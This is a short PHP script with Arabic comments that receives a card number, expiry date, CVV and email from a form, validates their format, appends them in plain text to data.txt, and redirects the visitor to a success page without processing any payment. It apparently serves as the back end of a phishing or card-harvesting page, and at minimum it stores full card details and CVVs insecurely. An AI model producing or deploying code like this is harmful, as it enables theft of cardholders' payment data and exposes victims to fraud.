<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = $_POST['cardNumber'];
    $expiryDate = $_POST['expiryDate'];
    $cvv = $_POST['cvv'];
    $email = $_POST['email'];

    // التحقق من صحة البيانات
    $errors = [];
    if (!preg_match('/^\d{16}$/', $cardNumber)) {
        $errors[] = "رقم البطاقة غير صحيح. يجب أن يحتوي على 16 رقمًا.";
    }
    if (!preg_match('/^\d{2}\/\d{2}$/', $expiryDate)) {
        $errors[] = "تاريخ الانتهاء غير صحيح. يجب أن يكون بالتنسيق MM/YY.";
    }
    if (!preg_match('/^\d{3}$/', $cvv)) {
        $errors[] = "رقم CVV غير صحيح. يجب أن يحتوي على 3 أرقام.";
    }
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = "البريد الإلكتروني غير صحيح.";
    }

    // إذا كانت هناك أخطاء
    if (!empty($errors)) {
        foreach ($errors as $error) {
            echo "<p>$error</p>";
        }
        exit;
    }

    // حفظ البيانات إذا كانت صحيحة
    $file = fopen("data.txt", "a");
    fwrite($file, "Card Number: $cardNumber\nExpiry Date: $expiryDate\nCVV: $cvv\nEmail: $email\n\n");
    fclose($file);

    // تحويل المستخدم إلى صفحة التأكيد
    header("Location: success.html");
    exit;
}
?>